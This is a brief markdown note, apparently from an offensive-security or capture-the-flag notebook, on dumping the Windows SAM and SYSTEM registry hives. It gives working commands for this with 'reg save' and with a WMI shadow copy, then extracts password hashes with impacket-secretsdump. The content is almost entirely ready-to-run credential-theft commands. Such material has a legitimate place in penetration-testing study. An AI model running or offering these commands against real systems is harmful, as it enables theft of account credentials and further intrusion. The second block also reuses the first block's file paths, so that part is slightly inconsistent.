## Dumping SAM and SYSTEM 

Simple enough, we can't dump it usually as it's constantly locked, even if we're a system user. However, we can make a copy of it and then move that over to Kali to decrypy with various tools, including secretsdump.

```powershell
reg save HKLM\sam C:\users\neo\downloads\sam2
reg save HKLM\system C:\users\neo\downloads\system2
# Copy to Kali
impacket-secretsdump -sam /opt/sam2 -system /opt/system2 LOCAL
```

Alternatively, we can use wmi to create a shadow copy.

```powershell
wmic shadowcopy call create Volume='C:\'

copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\sam C:\users\neo\Downloads\sam
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\system C:\users\neo\Downloads\system

# Copy to Kali
impacket-secretsdump -sam /opt/sam2 -system /opt/system2 LOCAL
```